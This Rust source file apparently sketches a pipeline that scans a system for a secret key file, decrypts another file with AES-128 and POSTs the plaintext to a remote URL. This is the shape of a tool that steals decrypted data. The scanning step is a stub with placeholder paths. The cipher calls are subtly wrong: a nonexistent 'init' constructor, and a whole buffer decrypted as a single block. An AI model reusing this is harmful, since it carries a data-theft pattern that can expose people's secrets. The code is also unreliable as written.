use std::fs;
use aes::Aes128;
use aes::cipher::BlockCipher;
use aes::cipher::generic_array::GenericArray;
use reqwest::Client;

#[derive(Clone)]
pub struct LocationsResult {
    pub secret_location: String,
    pub encrypt_location: String,
}

pub fn scan_system() -> LocationsResult {
    // Implementation goes here
    LocationsResult {
        secret_location: String::from("path/to/secret_file.txt"),
        encrypt_location: String::from("path/to/encrypt_file.txt"),
    }
}

pub fn parse_secret(locations: &LocationsResult) -> [u8; 16] {
    // Implementation goes here
    let secret_bytes = fs::read(&locations.secret_location)
        .unwrap_or_else(|err| panic!("Failed to read secret file: {}", err));
    // Parse the secret key from the secret location
    assert_eq!(secret_bytes.len(), 16, "Invalid secret key length");
    // For example, read it from a file
    let mut secret = [0; 16];
    secret.copy_from_slice(&secret_bytes);
    // Your parsing logic here...
    secret
}

pub fn decrypt_file(secret: [u8; 16], location: &str) -> Vec<u8> {
    // Implementation goes here
    let content = fs::read(location)
        .unwrap_or_else(|err| panic!("Failed to read encrypted file: {}", err));
    // Decrypt the file using the secret key
    let mut cipher = Aes128::init(&GenericArray::from_slice(&secret));




    let mut decrypted_content = content.to_vec();
    cipher.decrypt_block(&mut GenericArray::from_mut_slice(&mut decrypted_content));

    decrypted_content
}

pub async fn send_contents(content: Vec<u8>, url: &str) -> Result<(), reqwest::Error> {
    // Create an HTTP client
    let client = Client::new();

    // Send the contents to the remote server
    let response = client
        .post(url)
        .body(content)
        .send()
        .await?;

    // Ensure the response was successful
    response.error_for_status_ref()?;
    
    println!("Content successfully sent to {}", url);
    Ok(())
}
